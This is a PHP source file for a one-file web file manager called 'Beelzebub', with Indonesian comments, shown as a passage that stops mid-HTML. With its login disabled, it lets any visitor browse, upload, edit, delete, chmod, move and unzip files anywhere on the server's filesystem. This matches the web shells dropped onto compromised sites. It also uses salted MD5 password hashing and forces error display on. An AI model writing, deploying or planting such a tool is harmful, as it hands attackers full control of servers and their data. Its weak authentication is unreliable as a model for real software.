<?php
/**
 * Beelzebub File Manager (Full FS) + Session Login + MD5 (PHP 5.3+)
 * - Session-only auth (tanpa cookie custom). Sanitasi session id sebelum session_start().
 * - MD5 (dengan salt sederhana) sesuai permintaan. (Tidak disarankan untuk publik)
 * - Upload selalu ke folder aktif ($cwd).
 * - Fitur: Browse, Upload, Download, View, Edit, New, Rename (fix), Delete (fix non-nested),
 *          Chmod, Search, Zip/Unzip (fix base cwd), Sort, Move.
 */

@ini_set('display_errors', '1');
@ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

/* ===================== KONFIGURASI LOGIN ===================== */
define('AUTH_ENABLED', false);
define('AUTH_USERNAME', 'admin');
define('AUTH_PASSWORD_MD5', '82d21e53f74b7a30c620f25404837be9'); // isi hasil dari ?a=makehash
define('AUTH_SESSION_NAME', 'NFMSESSID');
define('AUTH_SESSION_TTL', 86400); // 1 hari idle timeout

/* ===================== KONFIG APLIKASI ===================== */
define('APP_TITLE', 'Beelzebub File Manager (Session + MD5)');
define('MAX_EDIT_BYTES', 2 * 1024 * 1024);
define('THUMB_MAX_DIM', 300);
define('ALLOW_CHMOD', true);
define('ALLOW_ZIP', true);
define('ALLOW_UNZIP', true);
define('ALLOW_SEARCH', true);
define('START_DIR', realpath(dirname(__FILE__)));

/* ===================== START SESSION AMAN (dengan sanitasi SID) ===================== */
@ini_set('session.use_only_cookies', '1');
@ini_set('session.use_strict_mode', '1');
@ini_set('session.use_trans_sid', '0'); // jangan sisipkan SID di URL
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_secure', (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? '1' : '0');
@ini_set('session.cookie_samesite', 'Lax'); // kalau PHP lama, diabaikan

if (session_name() !== AUTH_SESSION_NAME) {
    session_name(AUTH_SESSION_NAME);
}

/* Sanitasi cookie SID: hanya a-z A-Z 0-9 ,- dan panjang 1..128 */
if (isset($_COOKIE[AUTH_SESSION_NAME])) {
    $sid = (string)$_COOKIE[AUTH_SESSION_NAME];
    if (!preg_match('/^[A-Za-z0-9,-]{1,128}$/', $sid)) {
        unset($_COOKIE[AUTH_SESSION_NAME]);
        $cp = session_get_cookie_params();
        setcookie(AUTH_SESSION_NAME, '', time() - 3600, $cp['path'] ?: '/', $cp['domain'] ?: '', !empty($cp['secure']), !empty($cp['httponly']));
    } else {
        session_id($sid);
    }
}
session_start();

/* ===================== UTIL LOGIN ===================== */
function make_pwd_hash($plain){
    return md5('nfm$session$'.AUTH_USERNAME.'$'.$plain);
}
function is_logged_in(){
    if (!AUTH_ENABLED) return true;
    if (empty($_SESSION['nfm_user']) || $_SESSION['nfm_user'] !== AUTH_USERNAME) return false;
    if (empty($_SESSION['nfm_last'])) return false;
    if (time() - $_SESSION['nfm_last'] > AUTH_SESSION_TTL) return false;
    $_SESSION['nfm_last'] = time();
    return true;
}
function do_login($u, $p){
    if ($u === AUTH_USERNAME && make_pwd_hash($p) === AUTH_PASSWORD_MD5){
        $_SESSION = array();
        session_regenerate_id(true);
        $_SESSION['nfm_user'] = $u;
        $_SESSION['nfm_last'] = time();
        return true;
    }
    return false;
}
function do_logout(){
    $_SESSION = array();
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time()-42000, $params['path'], $params['domain'], !empty($params['secure']), !empty($params['httponly']));
    }
    session_destroy();
}

/* ===================== DEV HELPER: BUAT HASH PASSWORD (MD5) ===================== */
if (isset($_GET['a']) && $_GET['a']==='makehash') {
    $err = '';
    if ($_SERVER['REQUEST_METHOD']==='POST'){
        $p = isset($_POST['p'])?$_POST['p']:'';
        if ($p===''){ $err='Masukkan password'; }
        else {
            $h = make_pwd_hash($p);
            header('Content-Type: text/plain; charset=utf-8');
            echo "MD5 (tempel ke AUTH_PASSWORD_MD5):\n".$h."\n";
            exit;
        }
    }
    ?>
    <!doctype html><meta charset="utf-8"><title>Buat Hash Password (MD5)</title>
    <div style="max-width:520px;margin:40px auto;font-family:system-ui,Segoe UI,Roboto,Arial">
      <h2>Buat Hash Password (MD5)</h2>
      <?php if($err){ echo '<div style="color:#b00">'.$err.'</div>'; } ?>
      <form method="post">
        <input name="p" type="password" placeholder="Password..." style="padding:8px;width:100%"><br><br>
        <button style="padding:8px 12px">Generate</button>
      </form>
      <p style="color:#666">Setelah dapat hash, tempel ke konstanta <code>AUTH_PASSWORD_MD5</code> pada file ini.</p>
      <p style="color:#a66">Catatan: MD5 tidak direkomendasikan untuk sistem publik.</p>
    </div>
    <?php
    exit;
}

/* ===================== FS HELPERS ===================== */
function isWindows(){ return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'; }
function hasStreamWrapper($p){ return (bool)preg_match('#^[a-zA-Z0-9+\-.]+://#', $p); }
function isLocalFsPath($p){ return !hasStreamWrapper($p); }
function normPath($p){
    $p = str_replace(array('\\','//'), '/', $p);
    $parts = array();
    foreach (explode('/', $p) as $part){
        if ($part==='' || $part==='.') continue;
        if ($part==='..') array_pop($parts);
        else $parts[] = $part;
    }
    $path = implode('/', $parts);
    if (DIRECTORY_SEPARATOR === '\\') $path = str_replace('/', DIRECTORY_SEPARATOR, $path);
    return $path;
}
function safePath($candidate){
    $c = trim($candidate) !== '' ? $candidate : START_DIR;
    if (!isLocalFsPath($c)) exit('Akses ditolak: skema path tidak diizinkan.');
    $abs = $c;
    if (isWindows()){
        if (!preg_match('#^[A-Za-z]:\\\\#', $abs) && strpos($abs, '\\\\') !== 0){
            $abs = START_DIR.DIRECTORY_SEPARATOR.$abs;
        }
    } else {
        if (strpos($abs, '/') !== 0){
            $abs = START_DIR.DIRECTORY_SEPARATOR.$abs;
        }
    }
    $rp = @realpath($abs);
    if ($rp === false) $rp = normPath($abs);
    if (!isLocalFsPath($rp)) exit('Akses ditolak: skema path tidak diizinkan.');
    return $rp;
}
/* Relatif -> absolut berbasis $base (cwd) */
function resolvePath($candidate, $base){
    $c = trim((string)$candidate);
    if ($c === '') return $base;
    if (isWindows()){
        if (preg_match('#^[A-Za-z]:\\\\#',$c) || strpos($c,'\\\\')===0) return $c; // absolut
        return rtrim($base, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$c;
    } else {
        if (strpos($c,'/') === 0) return $c; // absolut
        return rtrim($base, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$c;
    }
}
function isTextFile($path){
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $textExt = array('txt','md','log','json','xml','yml','yaml','csv','ini','cfg','conf','php','js','ts','css','scss','less','html','htm','sh','bat','py','java','kt','c','cpp','cs','go','rb','lua','sql');
    if (in_array($ext, $textExt, true)) return true;
    if (is_file($path) && is_readable($path) && filesize($path) <= MAX_EDIT_BYTES){
        $sample = @file_get_contents($path, false, null, 0, 1024);
        if ($sample === false) return false;
        return (strpos($sample, "\0") === false);
    }
    return false;
}
function isImageFile($path){
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    return in_array($ext, array('png','jpg','jpeg','gif','webp','bmp','svg'), true);
}
function bytesHuman($b){
    $u = array('B','KB','MB','GB','TB'); $i=0;
    while ($b>=1024 && $i<count($u)-1){ $b/=1024; $i++; }
    return sprintf('%.2f %s', $b, $u[$i]);
}
function permString($path){
    $perms = @fileperms($path);
    if ($perms === false) return '?---------';
    $ftype = $perms & 0xF000;
    if ($ftype === 0xC000)      $type='s';
    elseif ($ftype === 0xA000)  $type='l';
    elseif ($ftype === 0x8000)  $type='f';
    elseif ($ftype === 0x6000)  $type='b';
    elseif ($ftype === 0x4000)  $type='d';
    elseif ($ftype === 0x2000)  $type='c';
    elseif ($ftype === 0x1000)  $type='p';
    else                        $type='?';
    $owner = (($perms & 0x0100)?'r':'').(($perms & 0x0080)?'w':'').(($perms & 0x0040)?(($perms & 0x0800)?'s':'x'):(($perms & 0x0800)?'S':'-'));
    $group = (($perms & 0x0020)?'r':'').(($perms & 0x0010)?'w':'').(($perms & 0x0008)?(($perms & 0x0400)?'s':'x'):(($perms & 0x0400)?'S':'-'));
    $world = (($perms & 0x0004)?'r':'').(($perms & 0x0002)?'w':'').(($perms & 0x0001)?(($perms & 0x0200)?'t':'x'):(($perms & 0x0200)?'T':'-'));
    return $type.$owner.$group.$world;
}
function mtimeStr($p){ $t=@filemtime($p); return $t?date('Y-m-d H:i:s',$t):'-'; }
function sortItems($items,$by,$dir){
    usort($items,function($a,$b)use($by,$dir){
        if ($a['is_dir']!==$b['is_dir']) return $a['is_dir']?-1:1;
        $va = isset($a[$by])?$a[$by]:'';
        $vb = isset($b[$by])?$b[$by]:'';
        if ($by==='size'||$by==='mtime'){ $va=(int)$va; $vb=(int)$vb; }
        if ($va==$vb) $cmp=0; else $cmp=($va<$vb?-1:1);
        return ($dir==='asc')?$cmp:-$cmp;
    });
    return $items;
}
function fileClip($path,$limit){
    if (!is_readable($path)) return '';
    $raw=@file_get_contents($path,false,null,0,$limit);
    if($raw===false) return '';
    return substr($raw,0,$limit);
}
function uniqueName($dir, $name){
    $target = rtrim($dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$name;
    if (!file_exists($target)) return $target;
    $ext = pathinfo($name, PATHINFO_EXTENSION);
    $base = pathinfo($name, PATHINFO_FILENAME);
    $i = 1;
    do{
        $new = $base.' ('.$i.')'.($ext?'.'.$ext:'');
        $target = rtrim($dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$new;
        $i++;
    }while(file_exists($target));
    return $target;
}
function isDescendantPath($parent, $child){
    $parent = rtrim(@realpath($parent) ?: $parent, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
    $child  = rtrim(@realpath($child)  ?: $child,  DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
    return strpos($child, $parent) === 0;
}
function copyDir($src, $dst){
    if (!is_dir($dst)) @mkdir($dst, 0775, true);
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($it as $f){
        $rel = substr($f->getPathname(), strlen($src)+1);
        $to = rtrim($dst, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$rel;
        if ($f->isDir()){
            if (!is_dir($to)) @mkdir($to, 0775, true);
        } else {
            @copy($f->getPathname(), $to);
        }
    }
    return true;
}
function h($s){ return htmlspecialchars($s,ENT_QUOTES,'UTF-8'); }
function q($s){ return rawurlencode($s); }
function breadcrumbAbs($path){
    if (isWindows()){
        $p = rtrim($path, DIRECTORY_SEPARATOR);
        if (preg_match('#^([A-Za-z]:)\\\\?#', $p, $m)) {
            $drive = $m[1];
            $rest = trim(substr($p, strlen($drive)), "\\/");
            $parts = $rest !== '' ? explode('\\', $rest) : array();
            $crumbs = array('<a href="?p='.h($drive.'\\').'">'.h($drive.'\\').'</a>');
            $accum = $drive.'\\';
            foreach($parts as $seg){
                $accum = rtrim($accum, '\\').'\\'.$seg;
                $crumbs[] = '<a href="?p='.h($accum).'">'.h($seg).'</a>';
            }
            return implode(' / ', $crumbs);
        } else {
            $rest = ltrim($p, "\\");
            $parts = $rest!=='' ? explode('\\', $rest) : array();
            $accum = '\\\\';
            $crumbs = array('<a href="?p='.h('\\\\').'">'.h('\\\\').'</a>');
            foreach($parts as $seg){
                $accum = rtrim($accum, '\\').'\\'.$seg;
                $crumbs[] = '<a href="?p='.h($accum).'">'.h($seg).'</a>';
            }
            return implode(' / ', $crumbs);
        }
    } else {
        $p = rtrim($path, '/'); if ($p === '') $p = '/';
        if ($p === '/') return '<a href="?p=/">/</a>';
        $rel = ltrim($p, '/'); $parts = $rel !== '' ? explode('/', $rel) : array();
        $crumbs = array('<a href="?p=/">/</a>'); $accum = '';
        foreach($parts as $seg){ $accum .= '/'.$seg; $crumbs[] = '<a href="?p='.h($accum).'">'.h($seg).'</a>'; }
        return implode(' / ', $crumbs);
    }
}

/* ===================== ROUTING LOGIN ===================== */
$action = isset($_GET['a'])?$_GET['a']:'';
if ($action === 'logout'){ do_logout(); header('Location: ?'); exit; }

if (AUTH_ENABLED && !is_logged_in()){
    $err = '';
    if ($action==='login' && $_SERVER['REQUEST_METHOD']==='POST'){
        $u = isset($_POST['u'])?$_POST['u']:'';
        $p = isset($_POST['p'])?$_POST['p']:'';
        if (do_login($u,$p)){
            $redir = isset($_GET['p']) ? '?p='.q($_GET['p']) : '?';
            header('Location: '.$redir); exit;
        } else {
            $err = 'Username atau password salah.';
        }
    }
    ?>
    <!doctype html>
    <html lang="id"><head>
    <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?php echo h(APP_TITLE); ?> – Login</title>
    <style>
    :root{--bg:#0b0e14;--panel:#111827;--text:#e5e7eb;--muted:#9aa3b2;--accent:#60a5fa;--border:#1f2937}
    *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
    .card{max-width:360px;margin:12vh auto;padding:20px;background:var(--panel);border:1px solid var(--border);border-radius:12px}
    input,button{width:100%;padding:10px;border-radius:10px;border:1px solid var(--border);background:#0f172a;color:#e5e7eb}
    button{background:var(--accent);border-color:#2563eb;margin-top:10px;color:#fff}
    .err{color:#fca5a5;margin-bottom:8px}
    h1{margin:0 0 12px 0;font-size:18px}
    .muted{color:#9aa3b2;font-size:12px;margin-top:10px}
    </style></head>
    <body>
      <div class="card">
        <h1><?php echo h(APP_TITLE); ?></h1>
        <?php if($err){ echo '<div class="err">'.h($err).'</div>'; } ?>
        <form method="post" action="?a=login<?php echo isset($_GET['p'])?'&p='.q($_GET['p']):''; ?>">
          <input name="u" placeholder="Username" autocomplete="username" autofocus><br><br>
          <input name="p" type="password" placeholder="Password" autocomplete="current-password">
          <button>Masuk</button>
        </form>
        <div class="muted">Buat hash MD5 di <code>?a=makehash</code>, lalu tempel ke file.</div>
      </div>
    </body></html>
    <?php
    exit;
}

/* ===================== FILE MANAGER (logged in) ===================== */
$requestedPath = isset($_GET['p'])?$_GET['p']:'';
$path = safePath($requestedPath);
$cwd  = is_dir($path) ? $path : dirname($path);

/* ===== Actions ===== */
if ($action==='download' && is_file($path) && is_readable($path)){
    $name = basename($path);
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.rawurlencode($name).'"');
    header('Content-Length: '.filesize($path));
    header('Cache-Control: no-cache, must-revalidate');
    readfile($path); exit;
}
if ($action==='view' && is_file($path) && is_readable($path)){
    $ext=strtolower(pathinfo($path,PATHINFO_EXTENSION));
    $map=array(
        'txt'=>'text/plain','log'=>'text/plain','md'=>'text/markdown','json'=>'application/json',
        'xml'=>'application/xml','svg'=>'image/svg+xml','png'=>'image/png','jpg'=>'image/jpeg',
        'jpeg'=>'image/jpeg','gif'=>'image/gif','webp'=>'image/webp','css'=>'text/css','js'=>'application/javascript','html'=>'text/html','htm'=>'text/html'
    );
    $ct = isset($map[$ext])?$map[$ext]:'application/octet-stream';
    header('Content-Type: '.$ct.'; charset=utf-8');
    header('Content-Length: '.filesize($path));
    readfile($path); exit;
}
if ($action==='zip' && $_SERVER['REQUEST_METHOD']==='POST' && ALLOW_ZIP && is_dir($cwd) && is_writable($cwd)){
    $items = isset($_POST['items'])?$_POST['items']:array();
    $zipName = trim(isset($_POST['zipname'])?$_POST['zipname']:'archive_'.date('Ymd_His').'.zip');
    if (!$items) exit('Tidak ada item dipilih.');
    $zipPath = rtrim($cwd, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$zipName;
    if (file_exists($zipPath)) exit('Nama arsip sudah ada.');
    if (class_exists('ZipArchive')){
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE)!==TRUE) exit('Gagal membuat ZIP.');
        foreach($items as $rel){
            $abs = rtrim($cwd, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$rel;
            $abs = safePath($abs);
            if (is_dir($abs) && is_readable($abs)){
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($abs, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                $base = basename($abs);
                foreach($it as $f){
                    $local = $base.'/'.substr($f->getPathname(), strlen($abs)+1);
                    $local = str_replace(DIRECTORY_SEPARATOR,'/',$local);
                    if ($f->isDir()) $zip->addEmptyDir($local);
                    else $zip->addFile($f->getPathname(), $local);
                }
            } elseif (is_file($abs) && is_readable($abs)){
                $zip->addFile($abs, basename($abs));
            }
        }
        $zip->close();
        header('Location: ?p='.rawurlencode($cwd).'&msg='.rawurlencode('ZIP dibuat: '.$zipName)); exit;
    } else exit('ZipArchive tidak tersedia.');
}
if ($action==='unzip' && $_SERVER['REQUEST_METHOD']==='POST' && ALLOW_UNZIP){
    $zipIn  = isset($_POST['zipfile']) ? $_POST['zipfile'] : '';
    $toIn   = isset($_POST['todir'])   ? $_POST['todir']   : '';
    // perbaikan: relatif dari $cwd
    $zipFile = safePath(resolvePath($zipIn, $cwd));
    $toDir   = safePath(resolvePath($toIn !== '' ? $toIn : $cwd, $cwd));

    if (!is_readable($zipFile)) exit('File arsip tidak dapat dibaca.');
    if (!is_dir($toDir)) @mkdir($toDir,0775,true);
    if (!is_dir($toDir) || !is_writable($toDir)) exit('Tujuan tidak bisa dipakai.');

    $done=false;
    if (class_exists('ZipArchive') && strtolower(pathinfo($zipFile,PATHINFO_EXTENSION))==='zip'){
        $zip=new ZipArchive();
        if($zip->open($zipFile)===TRUE){ $zip->extractTo($toDir); $zip->close(); $done=true; }
    }
    if(!$done && class_exists('PharData')){
        try{ $phar=new PharData($zipFile); $phar->extractTo($toDir,null,true); $done=true; }catch(Exception $e){}
    }
    if(!$done) exit('Gagal extract (ZipArchive/PharData tidak tersedia/format tidak didukung).');
    header('Location: ?p='.rawurlencode($toDir).'&msg='.rawurlencode('Unzip berhasil')); exit;
}
if ($action==='upload' && $_SERVER['REQUEST_METHOD']==='POST'){
    // SELALU ke folder aktif
    $dest = is_dir($cwd) ? $cwd : START_DIR;
    if (!is_writable($dest)) exit('Folder tujuan tidak writable.');

    $notif=array();
    if (!empty($_FILES['files'])){
        $files = array();
        if (is_array($_FILES['files']['name'])){
            $count = count($_FILES['files']['name']);
            for($i=0;$i<$count;$i++){
                $files[] = array(
                    'name' => $_FILES['files']['name'][$i],
                    'tmp'  => $_FILES['files']['tmp_name'][$i],
                    'err'  => $_FILES['files']['error'][$i],
                );
            }
        } else {
            $files[] = array(
                'name' => $_FILES['files']['name'],
                'tmp'  => $_FILES['files']['tmp_name'],
                'err'  => $_FILES['files']['error'],
            );
        }

        foreach($files as $f){
            $name=$f['name']; $tmp=$f['tmp']; $err=$f['err'];
            if ($err!==UPLOAD_ERR_OK){ $notif[]="❌ {$name} (error {$err})"; continue; }
            $target = uniqueName($dest, $name);
            $in = @fopen($tmp, 'rb');
            if (!$in){ $notif[]="❌ gagal buka tmp untuk {$name}"; continue; }
            $out = @fopen($target, 'xb');
            if (!$out){ fclose($in); $notif[]="❌ gagal tulis {$name}"; continue; }
            $ok = stream_copy_to_stream($in, $out) !== false;
            fclose($in); fclose($out);
            if (!$ok){ @unlink($target); $notif[]="❌ gagal salin {$name}"; continue; }
            @chmod($target, 0664);
            $notif[] = "✅ ".basename($target);
        }
    }
    header('Location: ?p='.rawurlencode($dest).'&msg='.rawurlencode(implode(' | ',$notif))); exit;
}
if ($action==='newfile' && $_SERVER['REQUEST_METHOD']==='POST'){
    $dir  = $cwd;
    if (!is_dir($dir) || !is_writable($dir)) exit('Folder tujuan tidak writable.');
    $name = trim(isset($_POST['name'])?$_POST['name']:'');
    $content = isset($_POST['content'])?$_POST['content']:'';
    if ($name==='') exit('Nama file kosong.');
    $target=uniqueName($dir,$name);
    if (@file_put_contents($target,$content)===false) exit('Gagal membuat file.');
    header('Location: ?p='.rawurlencode($target).'&msg='.rawurlencode('File dibuat.')); exit;
}
if ($action==='newdir' && $_SERVER['REQUEST_METHOD']==='POST'){
    $dir  = $cwd;
    if (!is_dir($dir) || !is_writable($dir)) exit('Folder tujuan tidak writable.');
    $name=trim(isset($_POST['name'])?$_POST['name']:'');
    if ($name==='') exit('Nama folder kosong.');
    $target=rtrim($dir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$name;
    if (file_exists($target)) exit('Folder sudah ada.');
    if (!@mkdir($target,0775,true)) exit('Gagal membuat folder.');
    header('Location: ?p='.rawurlencode($target).'&msg='.rawurlencode('Folder dibuat.')); exit;
}
if ($action==='rename' && $_SERVER['REQUEST_METHOD']==='POST'){
    $old = safePath(isset($_POST['old'])?$_POST['old']:''); 
    $newBase = trim(isset($_POST['new'])?$_POST['new']:'');
    // Sanitasi: hapus path separator agar tetap di folder yang sama
    $newBase = preg_replace('#[\\\\/]+#','', $newBase);
    if ($newBase==='') exit('Nama baru kosong / tidak valid.');
    $dstDir = dirname($old);
    if (!is_writable($old))    exit('Sumber tidak writable.');
    if (!is_writable($dstDir)) exit('Folder tujuan tidak writable.');
    $candidate = rtrim($dstDir, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$newBase;
    $new = file_exists($candidate) ? uniqueName($dstDir, $newBase) : $candidate;
    if (!@rename($old,$new)) exit('Gagal rename.');
    header('Location: ?p='.rawurlencode($new).'&msg='.rawurlencode('Rename berhasil.')); exit;
}
function rrmdir($dir){
    if (!is_dir($dir)) return false;
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
    foreach($it as $f){ if ($f->isDir()) @rmdir($f->getPathname()); else @unlink($f->getPathname()); }
    return @rmdir($dir);
}
if ($action==='delete' && $_SERVER['REQUEST_METHOD']==='POST'){
    $target=safePath(isset($_POST['target'])?$_POST['target']:''); $ok=false;
    if (is_dir($target)) $ok=rrmdir($target);
    elseif (is_file($target)) $ok=@unlink($target);
    header('Location: ?p='.rawurlencode(dirname($target)).'&msg='.rawurlencode($ok?'Terhapus.':'Gagal hapus.')); exit;
}
if ($action==='save' && $_SERVER['REQUEST_METHOD']==='POST'){
    $file=safePath(isset($_POST['file'])?$_POST['file']:''); $content=isset($_POST['content'])?$_POST['content']:'';
    if (!is_file($file) || !is_writable($file)) exit('File tidak bisa ditulis.');
    if (strlen($content) > MAX_EDIT_BYTES) exit('Konten terlalu besar.');
    $ok = (@file_put_contents($file,$content)!==false);
    header('Location: ?p='.rawurlencode($file).'&msg='.rawurlencode($ok?'Tersimpan.':'Gagal simpan.')); exit;
}
if ($action==='chmod' && $_SERVER['REQUEST_METHOD']==='POST' && ALLOW_CHMOD){
    $target=safePath(isset($_POST['target'])?$_POST['target']:''); $mode=isset($_POST['mode'])?$_POST['mode']:'';
    if (!preg_match('/^[0-7]{3,4}$/',$mode)) exit('Mode tidak valid.');
    $ok=@chmod($target, octdec($mode));
    header('Location: ?p='.rawurlencode($target).'&msg='.rawurlencode($ok?'CHMOD ok.':'CHMOD gagal.')); exit;
}
if ($action==='move' && $_SERVER['REQUEST_METHOD']==='POST'){
    $src = safePath(isset($_POST['src'])?$_POST['src']:'');
    $dstDir = safePath(isset($_POST['dst'])?$_POST['dst']:'');
    if (!file_exists($src)) exit('Sumber tidak ditemukan.');
    if (!is_dir($dstDir)) exit('Tujuan harus folder.');
    if (!is_writable($dstDir)) exit('Tujuan tidak writable.');
    if (is_dir($src) && isDescendantPath($src, $dstDir)) exit('Tidak boleh memindah folder ke dalam dirinya sendiri / turunannya.');
    $target = uniqueName($dstDir, basename($src));
    $ok = @rename($src, $target);
    if (!$ok){ $ok = (is_dir($src)?(copyDir($src, $target) && rrmdir($src)):(@copy($src, $target) && @unlink($src))); }
    header('Location: ?p='.rawurlencode($ok?$target:$src).'&msg='.rawurlencode($ok?'Dipindah.':'Gagal pindah.')); exit;
}

/* ===== Listing ===== */
$sortBy  = isset($_GET['sort'])?$_GET['sort']:'name';
$sortDir = isset($_GET['dir'])?$_GET['dir']:'asc';
$keyword = ($action==='search' && ALLOW_SEARCH)?trim(isset($_GET['q'])?$_GET['q']:''):'';

$items = array();
if (is_dir($cwd) && is_readable($cwd)){
    if ($action==='search' && $keyword!==''){
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cwd, FilesystemIterator::SKIP_DOTS));
        foreach($it as $fi){
            $p = $fi->getPathname();
            if (stripos($p,$keyword)!==false){
                $items[] = array('name'=>$fi->getFilename(),'path'=>$p,'is_dir'=>$fi->isDir(),'size'=>$fi->isFile()?$fi->getSize():0,'mtime'=>$fi->getMTime());
            }
        }
    } else {
        $scan=@scandir($cwd);
        if ($scan){
            foreach($scan as $n){
                if ($n==='.'||$n==='..') continue;
                $p=rtrim($cwd, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$n;
                $items[] = array('name'=>$n,'path'=>$p,'is_dir'=>@is_dir($p),'size'=>@is_file($p)?@filesize($p):0,'mtime'=>@filemtime($p)?@filemtime($p):0);
            }
        }
    }
    $items = sortItems($items,$sortBy,$sortDir);
}
$authUser = AUTH_ENABLED ? AUTH_USERNAME : 'guest';
?>
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo h(APP_TITLE); ?></title>
<style>
:root{--bg:#0b0e14;--panel:#111827;--text:#e5e7eb;--muted:#9aa3b2;--accent:#60a5fa;--danger:#ef4444;--border:#1f2937}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 system-ui,Segoe UI,Roboto,Arial}
header{position:sticky;top:0;background:linear-gradient(180deg,var(--panel),#0f172a);padding:10px 12px;border-bottom:1px solid var(--border);z-index:5}
.wrap{max-width:1100px;margin:0 auto;padding:10px}
h1{margin:0;font-size:16px}
.bar{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-top:8px}
.badge{padding:2px 6px;border:1px solid var(--border);border-radius:999px;font-size:12px;color:#9aa3b2}
a{color:#60a5fa;text-decoration:none}a:hover{text-decoration:underline}
.panel{background:#111827;padding:10px;border:1px solid #1f2937;border-radius:12px}
.grid{width:100%;border-collapse:collapse}.grid th,.grid td{padding:8px;border-bottom:1px solid #1f2937}
.grid th{font-weight:600;text-align:left}.right{text-align:right}
input,textarea,button,select{background:#0f172a;border:1px solid #1f2937;color:#e5e7eb;padding:6px 8px;border-radius:8px}
button.primary{background:#60a5fa;border-color:#2563eb;color:#fff}
button.danger{background:#ef4444;border-color:#b91c1c;color:#fff}
.msg{margin:10px 0;padding:8px 10px;background:#0a3821;border:1px solid #165a31;color:#bff2cc;border-radius:8px}
small.muted{color:#9aa3b2}
code.inline{padding:2px 4px;background:#0f172a;border:1px solid #1f2937;border-radius:6px}
summary{cursor:pointer}
footer{padding:20px;color:#9aa3b2;text-align:center}
</style>
</head>
<body>
<header>
  <div class="wrap">
    <div style="display:flex;align-items:center;gap:12px">
      <h1><?php echo h(APP_TITLE); ?></h1>
      <span class="badge">User: <?php echo h($authUser); ?></span>
      <a href="?a=logout" style="margin-left:auto">Logout</a>
    </div>
    <div class="bar">
      <div><?php echo breadcrumbAbs($cwd); ?></div>
      <div style="margin-left:auto">
        <form method="get" style="display:flex;gap:8px;align-items:center;margin:0">
          <input type="text" name="p" value="<?php echo h($cwd); ?>" style="min-width:360px">
          <button>Buka</button>
          <input type="hidden" name="a" value="browse">
        </form>
      </div>
    </div>
  </div>
</header>

<div class="wrap">
  <?php echo isset($_GET['msg'])?('<div class="msg">'.h((string)$_GET['msg']).'</div>'):''; ?>

  <div class="panel">
    <!-- Upload: SELALU ke folder aktif ($cwd) -->
    <form method="post" enctype="multipart/form-data" action="?a=upload&p=<?php echo q($cwd); ?>" style="display:flex;flex-wrap:wrap;gap:8px;align-items:center">
      <label>Upload ke: <span class="badge"><?php echo h($cwd); ?></span></label>
      <input type="file" name="files[]" multiple>
      <button class="primary">Upload</button>
    </form>

    <form method="get" style="margin-top:8px">
      <input type="hidden" name="p" value="<?php echo h($cwd); ?>">
      <input type="hidden" name="a" value="search">
      <input type="search" name="q" placeholder="Cari nama/file path..." style="min-width:260px" value="<?php echo isset($_GET['q'])?h($_GET['q']):''; ?>">
      <button>Cari</button>
    </form>

    <div style="margin-top:8px;display:flex;gap:8px;flex-wrap:wrap">
      <form method="post" action="?a=newdir&p=<?php echo q($cwd); ?>">
        <input name="name" placeholder="Nama folder baru">
        <button>Buat Folder</button>
      </form>
      <details>
        <summary>Buat File Baru</summary>
        <form method="post" action="?a=newfile&p=<?php echo q($cwd); ?>">
          <input name="name" placeholder="Nama file (mis. notes.txt)" required>
          <br><br><textarea name="content" rows="6" style="width:100%" placeholder="Isi awal (opsional)"></textarea>
          <br><button class="primary">Simpan</button>
        </form>
      </details>
      <?php if (ALLOW_UNZIP){ ?>
      <details>
        <summary>Unzip / Extract Arsip</summary>
        <form method="post" action="?a=unzip&p=<?php echo q($cwd); ?>">
          <input name="zipfile" placeholder="Path file arsip (zip/tar/tar.gz)" required style="min-width:260px">
          <input name="todir"  placeholder="Folder tujuan (opsional; default CWD)" style="min-width:260px">
          <button>Extract</button>
        </form>
      </details>
      <?php } ?>
    </div>
  </div>

  <div class="panel" style="margin-top:10px">
    <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
      <strong>Isi Folder:</strong>
      <span class="badge"><?php echo h($cwd); ?></span>
      <span style="margin-left:auto">
        Sort:
        <a href="?p=<?php echo q($cwd); ?>&sort=name&dir=<?php echo ($sortBy==='name'&&$sortDir==='asc')?'desc':'asc'; ?>">Nama</a> ·
        <a href="?p=<?php echo q($cwd); ?>&sort=size&dir=<?php echo ($sortBy==='size'&&$sortDir==='asc')?'desc':'asc'; ?>">Ukuran</a> ·
